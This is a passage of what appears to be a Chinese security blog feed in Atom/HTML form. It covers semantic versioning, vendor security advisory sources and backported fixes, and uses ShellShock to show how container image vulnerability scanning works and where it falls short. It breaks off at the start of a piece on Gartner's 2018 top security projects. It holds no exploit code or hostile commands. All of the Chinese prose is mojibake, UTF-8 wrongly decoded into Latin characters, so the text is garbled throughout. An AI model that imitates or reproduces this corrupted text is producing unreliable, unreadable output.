é€šç”¨çš„è½¯ä»¶ç‰ˆæœ¬è§„èŒƒ</h2><p>é‚£ä¹ˆå¤šçš„ç‰ˆæœ¬è§„èŒƒï¼Œæˆ‘ä»¬åº”è¯¥å¦‚ä½•è¿›è¡Œè§£æä¸æ¯”å¯¹å‘¢ï¼Ÿåœ¨è½¯ä»¶çš„å¼€å‘è¿‡ç¨‹ä¸­ï¼Œä¸€ä¸ªè§„èŒƒçš„è½¯ä»¶ç‰ˆæœ¬å®šä¹‰ä¸ä»…èƒ½è®©å¼€å‘äººå‘˜ä»¥ä¸€ç§æ ‡å‡†çš„æ–¹å¼æ¥è·Ÿè¸ªè®°å½•è½¯ä»¶çš„å˜åŒ–ï¼Œè¿˜èƒ½è®©ç”¨æˆ·äº†è§£åˆ°è½¯ä»¶çš„æ¼”å˜ã€‚</p><p>å…·ä½“çš„ç‰ˆæœ¬è§„èŒƒï¼Œå¤§å®¶å¯ä»¥åˆ°ä¾›åº”å•†çš„å®˜ç½‘è¿›è¡ŒæŸ¥è¯¢ä¸å­¦ä¹ ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ä»‹ç»ä¸€ç§åä¸ºâ€œ<a href="https://semver.org/lang/zh-CN/" title="è¯­ä¹‰åŒ–ç‰ˆæœ¬">è¯­ä¹‰åŒ–ç‰ˆæœ¬</a>â€çš„è§„èŒƒï¼Œå¹¶ä¸”åˆ—å‡ºæœ€é‡è¦çš„å‡ é¡¹åŸåˆ™ï¼š</p><ol><li><p>ä½¿ç”¨ä¸‰ä¸ªæ•°å­—ï¼ˆX.Y.Zï¼‰æ¥æ ‡è¯†ä¸»ç‰ˆæœ¬ï¼ˆMajor Versionï¼‰ã€æ¬¡ç‰ˆæœ¬ï¼ˆMinor Versionï¼‰å’Œè¡¥ä¸ç‰ˆæœ¬ï¼ˆPatch Versionï¼‰ï¼Œå¹¶ä¸”éµå¾ªä»¥ä¸‹è§„åˆ™</p><ul><li>ä¸»ç‰ˆæœ¬å·ï¼šåœ¨è¿›è¡Œä¸å…¼å®¹çš„ API ä¿®æ”¹æ—¶å¢åŠ </li><li>æ¬¡ç‰ˆæœ¬å·ï¼šåœ¨è¿›è¡Œå‘åå…¼å®¹çš„åŠŸèƒ½æ–°å¢æ—¶å¢åŠ ã€‚</li><li>ä¿®è®¢ç‰ˆæœ¬å·ï¼šåœ¨è¿›è¡Œå‘åå…¼å®¹çš„é—®é¢˜ä¿®å¤æ—¶å¢åŠ ã€‚</li></ul></li><li><p>å‘åå…¼å®¹æ€§ï¼šæ–°ç‰ˆæœ¬åº”è¯¥å°½å¯èƒ½åœ°å‘åå…¼å®¹ï¼Œä»¥ä¾¿ç”¨æˆ·å¯ä»¥å¹³æ»‘åœ°å‡çº§åˆ°æ–°ç‰ˆæœ¬è€Œä¸ä¼šå—åˆ°å½±å“ã€‚</p></li><li><p>ç‰ˆæœ¬ç¨³å®šæ€§ï¼šç‰ˆæœ¬å·ä¸­çš„åç¼€ï¼ˆå¦‚ alphaã€betaã€rcï¼‰åº”è¯¥æ˜ç¡®åœ°æŒ‡ç¤ºè¯¥ç‰ˆæœ¬çš„ç¨³å®šæ€§å’Œå¯ç”¨æ€§ï¼Œä»¥ä¾¿ç”¨æˆ·çŸ¥é“ä½•æ—¶å¯ä»¥å¼€å§‹ä½¿ç”¨å®ƒã€‚</p><table><thead><tr><th>ç‰ˆæœ¬ç±»å‹</th><th>è¡¨ç¤ºæ–¹å¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Alpha</td><td>X.Y.Z-alpha</td><td>æ˜¯è½¯ä»¶å¼€å‘è¿‡ç¨‹ä¸­çš„æ—©æœŸç‰ˆæœ¬ï¼Œé€šå¸¸åŒ…å«åŸºæœ¬åŠŸèƒ½çš„å®ç°ï¼Œä½†å¯èƒ½å­˜åœ¨è®¸å¤šé—®é¢˜å’Œé”™è¯¯ã€‚è¿™äº›ç‰ˆæœ¬é€šå¸¸åªåœ¨å¼€å‘äººå‘˜å†…éƒ¨ä½¿ç”¨ï¼Œä»¥è¿›è¡Œæµ‹è¯•å’Œåé¦ˆï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½ä¸ç¨³å®šï¼Œä¹Ÿä¸é€‚åˆä¸€èˆ¬ç”¨æˆ·ä½¿ç”¨ã€‚</td></tr><tr><td>Beta</td><td>X.Y.Z-beta</td><td>æ˜¯ç›¸å¯¹äº Alpha ç‰ˆæœ¬æ›´åŠ æˆç†Ÿå’Œç¨³å®šçš„ç‰ˆæœ¬ï¼Œé€šå¸¸åŒ…å«ä¸»è¦åŠŸèƒ½çš„å®ç°ï¼Œå¹¶ä¿®å¤äº†ä¸€äº›é”™è¯¯å’Œé—®é¢˜ã€‚è¿™äº›ç‰ˆæœ¬é€šå¸¸å¯¹å…¬ä¼—å¼€æ”¾ï¼Œä»¥ä¾¿æ›´å¤šçš„ç”¨æˆ·å‚ä¸æµ‹è¯•å’Œåé¦ˆã€‚</td></tr><tr><td>Release Candidate</td><td>X.Y.Z-rc</td><td>æ˜¯ç›¸å¯¹äº Beta ç‰ˆæœ¬æ›´åŠ ç¨³å®šå’Œæˆç†Ÿçš„ç‰ˆæœ¬ï¼Œé€šå¸¸æ˜¯å‘å¸ƒæ­£å¼ç‰ˆæœ¬ä¹‹å‰çš„æœ€åä¸€ä¸ªæµ‹è¯•ç‰ˆæœ¬ã€‚è¿™äº›ç‰ˆæœ¬é€šå¸¸å·²ç»åŒ…å«äº†æ‰€æœ‰çš„åŠŸèƒ½å’Œä¿®å¤ï¼Œä½†å¯èƒ½è¿˜éœ€è¦ä¸€äº›å¾®è°ƒå’Œæœ€ç»ˆçš„æµ‹è¯•ã€‚</td></tr></tbody></table></li><li><p>å‘å¸ƒè¯´æ˜ï¼šæ¯ä¸ªç‰ˆæœ¬åº”è¯¥æœ‰ä¸€ä¸ªæ¸…æ™°çš„å‘å¸ƒè¯´æ˜ï¼ŒåŒ…æ‹¬æ–°åŠŸèƒ½ã€é—®é¢˜ä¿®å¤å’Œä»»ä½•å‘åä¸å…¼å®¹çš„æ›´æ”¹ã€‚</p></li><li><p>ç‰ˆæœ¬æ§åˆ¶ï¼šä½¿ç”¨ç‰ˆæœ¬æ§åˆ¶å·¥å…·ï¼ˆå¦‚ Gitï¼‰æ¥ç®¡ç†è½¯ä»¶çš„ç‰ˆæœ¬ï¼Œå¹¶ç¡®ä¿æ¯ä¸ªç‰ˆæœ¬éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ç¬¦ã€‚</p></li><li><p>é€æ˜åº¦å’Œå¯é¢„æµ‹æ€§ï¼šå¼€å‘å›¢é˜Ÿåº”è¯¥ä¸ç”¨æˆ·ä¿æŒé€æ˜ï¼Œæä¾›æœ‰å…³ç‰ˆæœ¬å·å’Œè½¯ä»¶å‘å±•çš„è¶‹åŠ¿å’Œè®¡åˆ’çš„ä¿¡æ¯ï¼Œä»¥ä¾¿ç”¨æˆ·å¯ä»¥åšå‡ºæ˜æ™ºçš„å†³ç­–ã€‚</p></li></ol><h2 id="0x03-å®‰å…¨å…¬å‘Šæ•°æ®"><a href="#0x03-å®‰å…¨å…¬å‘Šæ•°æ®" class="headerlink" title="0x03 å®‰å…¨å…¬å‘Šæ•°æ®"></a>0x03 å®‰å…¨å…¬å‘Šæ•°æ®</h2><p>è‹¥è¯´ç±»ä¼¼äº NVD çš„æ¼æ´ä¿¡æ¯æ²¡æœ‰è€ƒè™‘åˆ°æ“ä½œç³»ç»Ÿçš„å‘è¡Œç‰ˆæœ¬ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†ä¾›åº”å•†çš„å®‰å…¨å…¬å‘Šæ•°æ®ä½œä¸ºæ‰«æä¾æ®ï¼Œå†ä½¿ç”¨ NVD æ•°æ®è¡¥å……æ¼æ´è¯¦æƒ…ã€‚</p><p>å®‰å…¨å…¬å‘Šæ•°æ®ï¼ˆSecurity Advisory Dataï¼‰æ˜¯æŒ‡æœ‰å…³è®¡ç®—æœºè½¯ä»¶ã€æ“ä½œç³»ç»Ÿã€åº“ã€æ¡†æ¶æˆ–å…¶ä»–ç›¸å…³æŠ€æœ¯çš„å®‰å…¨æ¼æ´å’Œä¿®å¤æªæ–½çš„ä¿¡æ¯ã€‚è¿™äº›æ•°æ®é€šå¸¸ç”±è½¯ä»¶ä¾›åº”å•†ã€å¼€å‘è€…ç¤¾åŒºæˆ–å®‰å…¨ç ”ç©¶äººå‘˜å‘å¸ƒï¼Œæ—¨åœ¨å‘ç”¨æˆ·å’Œå¼€å‘è€…æä¾›æœ‰å…³å·²çŸ¥å®‰å…¨æ¼æ´çš„è¯¦ç»†ä¿¡æ¯ä»¥åŠå¦‚ä½•ä¿®å¤æˆ–ç¼“è§£è¿™äº›æ¼æ´çš„å»ºè®®ã€‚æˆ‘ä»¬æ”¶é›†äº†å¸¸è§çš„å®‰å…¨å…¬å‘Šæ•°æ®å¦‚ä¸‹æ‰€ç¤ºï¼š</p><table><thead><tr><th>æ“ä½œç³»ç»Ÿä¾›åº”å•†</th><th>å®‰å…¨å…¬å‘Šæ•°æ®æº</th></tr></thead><tbody><tr><td>Arch Linux</td><td><a href="https://security.archlinux.org/" title="Vulnerable Issues">Vulnerable Issues</a></td></tr><tr><td>Alpine Linux</td><td><a href="https://secdb.alpinelinux.org/" title="secdb">secdb</a></td></tr><tr><td>Wolfi Linux</td><td><a href="https://packages.wolfi.dev/os/security.json" title="secdb">secdb</a></td></tr><tr><td>Chainguard</td><td><a href="https://packages.cgr.dev/chainguard/security.json" title="secdb">secdb</a></td></tr><tr><td>Amazon Linux</td><td><a href="https://alas.aws.amazon.com/" title="Amazon Linux Security Center">Amazon Linux Security Center</a></td></tr><tr><td>Debian</td><td><a href="https://security-tracker.debian.org/tracker/" title="Security Bug Tracker">Security Bug Tracker</a> &#x2F; <a href="https://www.debian.org/security/oval/" title="OVAL">OVAL</a></td></tr><tr><td>Ubuntu</td><td><a href="https://ubuntu.com/security/cve" title="Ubuntu CVE Tracker">Ubuntu CVE Tracker</a></td></tr><tr><td>RHEL&#x2F;CentOS</td><td><a href="https://www.redhat.com/security/data/oval/v2/" title="OVAL">OVAL</a> &#x2F; <a href="https://www.redhat.com/security/data/metrics/" title="Security Data">Security Data</a></td></tr><tr><td>AlmaLinux</td><td><a href="https://errata.almalinux.org/" title="AlmaLinux Product Errata">AlmaLinux Product Errata</a></td></tr><tr><td>Rocky Linux</td><td><a href="https://download.rockylinux.org/pub/rocky/" title="Rocky Linux UpdateInfo">Rocky Linux UpdateInfo</a></td></tr><tr><td>Oracle Linux</td><td><a href="https://linux.oracle.com/security/oval/" title="OVAL">OVAL</a></td></tr><tr><td>CBL-Mariner</td><td><a href="https://github.com/microsoft/CBL-MarinerVulnerabilityData/" title="OVAL">OVAL</a></td></tr><tr><td>OpenSUSE&#x2F;SLES</td><td><a href="http://ftp.suse.com/pub/projects/security/cvrf/" title="CVRF">CVRF</a></td></tr><tr><td>Photon OS</td><td><a href="https://packages.vmware.com/photon/photon_cve_metadata/" title="Photon Security Advisory">Photon Security Advisory</a></td></tr></tbody></table><table><thead><tr><th>è¯­è¨€</th><th>æ•°æ®æº</th></tr></thead><tbody><tr><td>PHP</td><td><a href="https://github.com/FriendsOfPHP/security-advisories" title="PHP Security Advisories Database">PHP Security Advisories Database</a></td></tr><tr><td></td><td><a href="https://github.com/advisories?query=ecosystem:composer" title="GitHub Advisory Database (Composer)">GitHub Advisory Database (Composer)</a></td></tr><tr><td>Python</td><td><a href="https://github.com/advisories?query=ecosystem:pip" title="GitHub Advisory Database (pip)">GitHub Advisory Database (pip)</a></td></tr><tr><td></td><td><a href="https://osv.dev/list?q=&ecosystem=PyPI" title="Open Source Vulnerabilities (PyPI)">Open Source Vulnerabilities (PyPI)</a></td></tr><tr><td>Ruby</td><td><a href="https://github.com/rubysec/ruby-advisory-db" title="Ruby Advisory Database">Ruby Advisory Database</a></td></tr><tr><td></td><td><a href="https://github.com/advisories?query=ecosystem:rubygems" title="GitHub Advisory Database (RubyGems)">GitHub Advisory Database (RubyGems)</a></td></tr><tr><td>Node.js</td><td><a href="https://github.com/nodejs/security-wg" title="Ecosystem Security Working Group">Ecosystem Security Working Group</a></td></tr><tr><td></td><td><a href="https://github.com/advisories?query=ecosystem:npm" title="GitHub Advisory Database (npm)">GitHub Advisory Database (npm)</a></td></tr><tr><td>Java</td><td><a href="https://gitlab.com/gitlab-org/advisories-community" title="GitLab Advisories Community">GitLab Advisories Community</a></td></tr><tr><td></td><td><a href="https://github.com/advisories?query=ecosystem:maven" title="GitHub Advisory Database (Maven)">GitHub Advisory Database (Maven)</a></td></tr><tr><td>Go</td><td><a href="https://github.com/advisories?query=ecosystem:go" title="GitHub Advisory Database (Go)">GitHub Advisory Database (Go)</a></td></tr><tr><td>Rust</td><td><a href="https://osv.dev/list?q=&ecosystem=crates.io" title="Open Source Vulnerabilities (crates.io)">Open Source Vulnerabilities (crates.io)</a></td></tr><tr><td>.NET</td><td><a href="https://github.com/advisories?query=ecosystem:nuget" title="GitHub Advisory Database (NuGet)">GitHub Advisory Database (NuGet)</a></td></tr><tr><td>C&#x2F;C++</td><td><a href="https://gitlab.com/gitlab-org/advisories-community" title="GitLab Advisories Community">GitLab Advisories Community</a></td></tr><tr><td>Dart</td><td><a href="https://github.com/advisories?query=ecosystem:pub" title="GitHub Advisory Database (Pub)">GitHub Advisory Database (Pub)</a></td></tr><tr><td>Elixir</td><td><a href="https://github.com/advisories?query=ecosystem:erlang" title="GitHub Advisory Database (Erlang)">GitHub Advisory Database (Erlang)</a></td></tr><tr><td>Swift</td><td><a href="https://github.com/advisories?query=ecosystem:swift" title="GitHub Advisory Database (Swift)">GitHub Advisory Database (Swift)</a></td></tr></tbody></table><p>ä¸ºä»€ä¹ˆè¦ä½¿ç”¨å®‰å…¨å…¬å‘Šæ•°æ®å‘¢ï¼Ÿè¿™é‡Œç‰µæ¶‰åˆ°ä¸€ä¸ªå«åšâ€œå‘åç§»æ¤å®‰å…¨ä¿®å¤â€çš„æ¦‚å¿µäº†ã€‚</p><p>å‘åç§»æ¤å®‰å…¨ä¿®å¤æŒ‡çš„æ˜¯å°†ä¸Šæ¸¸è½¯ä»¶åŒ…çš„æ–°çš„ç‰ˆæœ¬çš„å®‰å…¨ä¿®å¤åº”ç”¨åˆ°ä¸‹æ¸¸çš„æ—§çš„ç‰ˆæœ¬çš„è½¯ä»¶åŒ…ä¸­ã€‚è¿™åœ¨ RedHatã€Debian å’Œ Ubuntu ç­‰æ“ä½œç³»ç»Ÿä¾›åº”å•†ä¸­éå¸¸å¸¸è§ã€‚</p><p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª CVE ç¼–å·ä¸º CVE-2014-3670 çš„æ¼æ´ï¼Œè¯¥æ¼æ´å½±å“æ‰€æœ‰ç‰ˆæœ¬çš„ PHPï¼Œè€Œæˆ‘ä»¬ä½¿ç”¨çš„ PHP5.3 å·²ç»äº 2014 å¹´ 8 æœˆ 14 æ—¥åœæ­¢äº†ç»´æŠ¤ï¼Œè€Œæˆ‘ä»¬åˆå‡ºäºå„ç§è€ƒè™‘ï¼Œä¸èƒ½å‡çº§åˆ° PHP5.4 æ¥ç¼“è§£è¯¥æ¼æ´ï¼Œé‚£ä¹ˆ RedHat ä¾›åº”å•†å°±ä¼šå°†è¡¥ä¸å‘åç§»æ¤åˆ° PHP5.3 ä¸­ä»¥è¾¾åˆ°å®‰å…¨ä¿®å¤çš„ç›®çš„ã€‚å½“ç„¶ï¼Œå‘åç§»æ¤å®‰å…¨ä¿®å¤éœ€è¦è€ƒè™‘åˆ°æ˜¯å¦ä¿®å¤æˆåŠŸä»¥åŠä¼šä¸ä¼šå½±å“åˆ°å…¶ä»–çš„ä»£ç å’ŒåŠŸèƒ½ç­‰é—®é¢˜ï¼Œä½†è¿™äº›å·¥ä½œéƒ½ç”± Redhat å®˜æ–¹ç»´æŠ¤å›¢é˜Ÿæ¥åšï¼Œæˆ‘ä»¬åªéœ€è¦ä»å®˜æ–¹æºä¸­ä¸‹è½½ PHP5.3ï¼Œå°±ä¸ä¼šå—åˆ°è¯¥æ¼æ´çš„å½±å“ã€‚</p><p>å› æ­¤ï¼Œä»…å‚è€ƒè½¯ä»¶åŒ…çš„ç‰ˆæœ¬æ¥åˆ¤æ–­è¯¥è½¯ä»¶åŒ…æ˜¯å¦æœ‰æ¼æ´å¯èƒ½ä¼šäº§ç”Ÿå¤§é‡çš„è¯¯æŠ¥ï¼Œå› ä¸ºè¿™æ²¡æœ‰è€ƒè™‘åˆ°ä¾›åº”å•†å·²ç»å‘åç§»æ¤äº†å®‰å…¨ä¿®å¤ç¨‹åºçš„æƒ…å†µã€‚ä¸ºäº†ä½¿å¤§å®¶äº†è§£åˆ°æ›´å¤šçš„å‘åç§»æ¤å®‰å…¨ä¿®å¤çš„é—®é¢˜ï¼Œä¾›åº”å•†å¾€å¾€ä¼šæä¾›ä¸€ä¸ªå®‰å…¨å…¬å‘Šçš„ç½‘å€ï¼Œè¯¦ç»†çš„å‘å¤§å®¶è¯´æ˜å®‰å…¨ä¿®å¤æƒ…å†µï¼Œå¹¶ä¸”å¤§éƒ¨åˆ†ä¾›åº”å•†ä¼šå°† CVE ç¼–å·é™„åŠ åˆ°å®‰å…¨å…¬å‘Šä¸­ï¼Œä»¥ä¾¿å¤§å®¶å¯ä»¥ç›´æ¥äº†è§£åˆ°æŸ CVE æ¼æ´çš„åœ¨è¯¥äº§å“ä¸­çš„ä¿®å¤æƒ…å†µã€‚</p><p>ä¸ºäº†è¿›ä¸€æ­¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä¸€äº›ä¾›åº”å•†è¿˜æä¾›äº†<a href="https://oval.mitre.org/" title="OVAL">OVAL</a>ç»“æ„åŒ–æ•°æ®ï¼Œè¯¥æ•°æ®ä¸ºæœºå™¨å¯è¯»ï¼Œå¯ä»¥ç›´æ¥é›†æˆåˆ°æ‰«æå™¨ä¸­ã€‚</p><h2 id="0x04-å®¹å™¨é•œåƒçš„æ‰«æåŸç†"><a href="#0x04-å®¹å™¨é•œåƒçš„æ‰«æåŸç†" class="headerlink" title="0x04 å®¹å™¨é•œåƒçš„æ‰«æåŸç†"></a>0x04 å®¹å™¨é•œåƒçš„æ‰«æåŸç†</h2><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä»¥ ShellShock ä½œä¸ºæ¡ˆä¾‹æ¥è¯´æ˜å®¹å™¨é•œåƒçš„æ‰«æåŸç†ã€‚</p><p>ShellShock æ˜¯ä¸€ä¸ªå½±å“ GNU bash çš„ä¸€ä¸ªè¶…å±æ¼æ´ï¼ŒNVD ç»™å…¶åˆ†é…äº† CVE-2014-6271 ç¼–å·ï¼Œå¹¶ä¸”åœ¨è¯¥æ¼æ´ä¿¡æ¯çš„ CPE æ•°æ®ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° bash çš„ 1.14.0ï½4.3 ç‰ˆæœ¬éƒ½å—å…¶å½±å“ã€‚</p><p><img src="/image/image_uJU3nXzKvt.png" alt="å›¾ 5ï¼šShellShock å½±å“çš„ bash ç‰ˆæœ¬" title="å›¾5ï¼šShellShockå½±å“çš„bashç‰ˆæœ¬"></p><p>é‚£ä¹ˆ Ubuntu 12.04 ä¸Šçš„ bash 4.2-2ubuntu2.2ï¼ˆåŸºäº bash 4.2ï¼‰æ˜¯æœ‰æ¼æ´çš„å—ï¼Ÿå½“ç„¶ä¸æ˜¯ï¼Œæˆ‘ä»¬æŸ¥çœ‹äº† Ubuntu çš„å®‰å…¨å…¬å‘Šæ•°æ®ï¼Œå‘ç° bash 4.2-2ubuntu2.2 å·²ç»ä¿®å¤äº†è¯¥æ¼æ´ï¼Œå› æ­¤è¯¥ bash æ˜¯å®‰å…¨çš„ã€‚</p><p><img src="/image/image_9gDrEAAdbi.png" alt="å›¾ 6ï¼šubuntu å®‰å…¨å…¬å‘Šæ•°æ®ï¼ˆCVE-2014-6271ï¼‰" title="å›¾6ï¼šubuntuå®‰å…¨å…¬å‘Šæ•°æ®ï¼ˆCVE-2014-6271ï¼‰"></p><p>è‹¥å‡ºäºå„ç§åŸå› ï¼Œä¸èƒ½å°† bash å‡çº§åˆ°æœ€æ–°çš„æ¬¡ç‰ˆæœ¬ï¼Œé‚£ä¹ˆä½ å¯ä»¥é€šè¿‡å®˜æ–¹æºæ›´æ–° bash åˆ°è¯¥ç‰ˆæœ¬ä»¥ä¿®å¤æ¼æ´ï¼Œä¾›åº”å•†ä¼šè‡ªè¡Œè¿›è¡Œå‘åç§»æ¤çš„å®‰å…¨ä¿®å¤å·¥ä½œã€‚</p><p>é‚£ä¸åŒçš„åº”ç”¨ç¨‹åºä¼šä¾èµ–äºä¸åŒçš„ç‰ˆæœ¬çš„è½¯ä»¶åŒ…ï¼Œé‚£å…¼å®¹æ€§çš„é—®é¢˜æ€ä¹ˆåŠå‘€ï¼Ÿåˆ«å¿˜äº†å®¹å™¨æ˜¯å¯ä»¥ä¸ºåº”ç”¨ç¨‹åºæä¾›ä¸€ç§è½»é‡çº§çš„éš”ç¦»ç¯å¢ƒçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å®¹å™¨å¯ä»¥ä¸ºåº”ç”¨ç¨‹åºæä¾›ä¸€ä¸ªç‹¬ç«‹çš„æ ¹æ–‡ä»¶ç³»ç»Ÿã€‚</p><h2 id="0x05-é•œåƒæ¼æ´æ‰«æçš„å±€é™"><a href="#0x05-é•œåƒæ¼æ´æ‰«æçš„å±€é™" class="headerlink" title="0x05 é•œåƒæ¼æ´æ‰«æçš„å±€é™"></a>0x05 é•œåƒæ¼æ´æ‰«æçš„å±€é™</h2><p>è¯´åˆ°è¿™é‡Œï¼Œå¤§å®¶å¯èƒ½æ„è¯†åˆ°ï¼Œå®¹å™¨é•œåƒæ‰«æå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œé‚£å°±æ˜¯ï¼š<strong>åªèƒ½æ‰«æç±»ä¼¼äº Red Hat å’Œ Debian ç­‰ä¾›åº”å•†æ‰€æä¾›çš„è½¯ä»¶åŒ…ï¼Œä¸èƒ½æ‰«æç¬¬ä¸‰æ–¹çš„ã€è‡ªç¼–è¯‘çš„è½¯ä»¶åŒ…</strong>ã€‚</p><p>è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦éµä»å„ç§æœ€ä½³å®‰å…¨å®è·µæ¥å›é¿è¿™æ–¹é¢çš„é£é™©ã€‚ä¾‹å¦‚ï¼Œåœ¨æœ€æ–°çš„ CIS Docker åŸºå‡†ä¸­å°±æœ‰æåˆ°ï¼šåœ¨å°†è½¯ä»¶åŒ…å®‰è£…åˆ°é•œåƒä¹‹å‰ï¼Œåº”è¯¥éªŒè¯å…¶çœŸå®æ€§ã€‚æ²¡æœ‰å·²çŸ¥æ¥æºçš„è½¯ä»¶åŒ…å¯èƒ½æ˜¯æ¶æ„çš„æˆ–å­˜åœ¨å¯è¢«åˆ©ç”¨çš„æ¼æ´ï¼Œä½ åº”è¯¥ä½¿ç”¨å®‰å…¨çš„è½¯ä»¶åŒ…åˆ†å‘æœºåˆ¶ã€‚</p><p><img src="/image/image_nFXA8w-ikA.png" alt="å›¾ 7ï¼šCIS Docker åŸºå‡†ç¬¬ 4.11 é¡¹" title="å›¾7ï¼šCIS Docker åŸºå‡†ç¬¬ 4.11é¡¹"></p><h2 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06 æ€»ç»“"></a>0x06 æ€»ç»“</h2><p>æœ¬æ–‡æˆ‘ä»¬äº†è§£äº†æ¼æ´çš„å‘å¸ƒä¸è·Ÿè¸ªæµç¨‹ï¼Œå¹¶æµè§ˆäº†é€šç”¨çš„è½¯ä»¶ç‰ˆæœ¬è§„èŒƒçš„åŸåˆ™ã€‚</p><p>æ€»è€Œè¨€ä¹‹ï¼Œå®¹å™¨é•œåƒæ‰«æçš„åŸç†æ˜¯ï¼šä½ éœ€è¦ä¸€ä»½è½¯ä»¶åŒ…æ¸…å•å’Œä¸€ä»½å®‰å…¨å…¬å‘Šæ•°æ®æ¸…å•ï¼Œé€šè¿‡åŒ¹é…å…¶ä¸­çš„è½¯ä»¶åŒ…åç§°å’Œç‰ˆæœ¬ï¼Œå¯ä»¥è¯†åˆ«é•œåƒä¸­å“ªäº›è½¯ä»¶åŒ…å­˜åœ¨æ¼æ´ã€‚</p><p>ç„¶è€Œï¼Œè‹¥ä½¿ç”¨æ¼æ´æ•°æ®ä½œä¸ºæ‰«æçš„ä¾æ®ï¼Œç”±äºä¾›åº”å•†é€šå¸¸ä¼šå‘åç§»æ¤å®‰å…¨ä¿®å¤ç¨‹åºï¼Œè¿™å¯èƒ½å¯¼è‡´å¤§é‡è¯¯æŠ¥ã€‚ä»åŸç†ä¸Šçœ‹ï¼Œé•œåƒæ¼æ´æ‰«æåªèƒ½æ£€æµ‹ aptã€yumã€rpm æˆ– apk ç­‰è½¯ä»¶åŒ…ç®¡ç†å™¨åˆ†å‘çš„è½¯ä»¶åŒ…ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦éµå¾ªä¸€äº›æœ€ä½³å®‰å…¨å®è·µï¼Œåœ¨æ„å»ºé•œåƒæ—¶é¿å…ä½¿ç”¨æ¥æºä¸æ˜çš„å®‰è£…æºã€‚</p><p>åœ¨åº”ç”¨ç¨‹åºå±‚é¢ï¼Œå¤§å¤šæ•°åº”ç”¨ç¨‹åºä¼šä½¿ç”¨ç‰¹å®šè¯­è¨€çš„ç¬¬ä¸‰æ–¹ä¾èµ–åº“ï¼Œè€Œè¿™äº›ä¾èµ–åº“ä¹Ÿæ˜¯æ½œåœ¨çš„æ¼æ´æ¥æºã€‚æˆ‘ä»¬åº”è¯¥å¦‚ä½•åº”å¯¹å‘¢ï¼Ÿè¯·å…³æ³¨ä¸‹æœŸå†…å®¹ï½</p>]]></content>
    
    
    
    <tags>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gartner 2018 å¹´åå¤§å®‰å…¨é¡¹ç›®</title>
    <link href="/2024/05/18/Gartner-2018-%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE/"/>
    <url>/2024/05/18/Gartner-2018-%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä½œä¸ºé¦–å¸­ä¿¡æ¯å®‰å…¨å®˜ï¼ˆchief information security officerï¼ŒCISOï¼‰ï¼Œæ‚¨æ˜¯å¦è¢«æ·¹æ²¡äºä¸€å †å¾…åŠåˆ—è¡¨ä¸­ï¼Ÿæ˜¯å¦çº ç»“äºè¯¥é‡ç‚¹å…³æ³¨å“ªäº›å®‰å…¨é¡¹ç›®ï¼Ÿ</p><p>Gartner çš„æ°å‡ºå‰¯æ€»è£åˆ†æå¸ˆ<a href="https://www.gartner.com/analyst/7299">Neil MacDonald</a>åœ¨é©¬é‡Œå…°å·å›½å®¶æ¸¯ä¸¾è¡Œçš„ 2018 å¹´ <a href="https://www.gartner.com/en/conferences/na/security-risk-management">Gartner å®‰å…¨ä¸é£é™©ç®¡ç†å³°ä¼š</a>ä¸Šåˆ†äº«äº†æœ€èƒ½é™ä½é£é™©ã€æœ€èƒ½å¯¹ä¸šåŠ¡äº§ç”Ÿç§¯æå½±å“çš„åå¤§é¡¹ç›®ã€‚</p><p>è¿™äº›é¡¹ç›®ä¸ä»…ä»…æ˜¯ä¸€äº›ç®€å•çš„ç¨‹åºï¼Œå®ƒèƒŒåè¿˜æœ‰çœŸæ­£çš„æŠ€æœ¯ä½œä¸ºæ”¯æ’‘ï¼Œä½¿å¾—è¿™äº›é¡¹ç›®æ›´åŠ å®Œæ•´å¯é ã€‚å¹¶ä¸” MacDonald è¿˜è¡¥å……é“ï¼šâ€œè¿™äº›é¡¹ç›®å¯¹äºå¤§å¤šæ•° CISO è€Œè¨€æ˜¯é™Œç”Ÿçš„ï¼Œå› ä¸ºå®ƒä»¬åœ¨ä¼ä¸šçš„é‡‡ç”¨ç‡è¿˜ä¸åˆ° 50%â€</p><h2 id="Top-1-ç‰¹æƒè´¦æˆ·ç®¡ç†"><a href="#Top-1-ç‰¹æƒè´¦æˆ·ç®¡ç†" class="headerlink" title="Top 1 ç‰¹æƒè´¦æˆ·ç®¡ç†"></a>Top 1 ç‰¹æƒè´¦æˆ·ç®¡ç†</h2><p>è¯¥é¡¹ç›®ä¸ä»…ä½¿æ”»å‡»è€…æ›´éš¾è®¿é—®ç‰¹æƒè´¦æˆ·ï¼Œè¿˜å…è®¸å®‰å…¨å›¢é˜Ÿç›‘æ§å¼‚å¸¸çš„è®¿é—®è¡Œä¸ºã€‚</p><p>è‡³å°‘ï¼ŒCISO åº”è¯¥è®©ç®¡ç†å‘˜éƒ½ä½¿ç”¨å¤šå› ç´ è®¤è¯ï¼ˆmultifactor authenticationï¼ŒMFAï¼‰ï¼Œä¹Ÿå»ºè®® CISO è®©ç¬¬ä¸‰æ–¹è®¿é—®ï¼ˆæ¯”å¦‚è¯´æ‰¿åŒ…å•†ï¼‰ä¹Ÿä½¿ç”¨å¤šå› ç´ 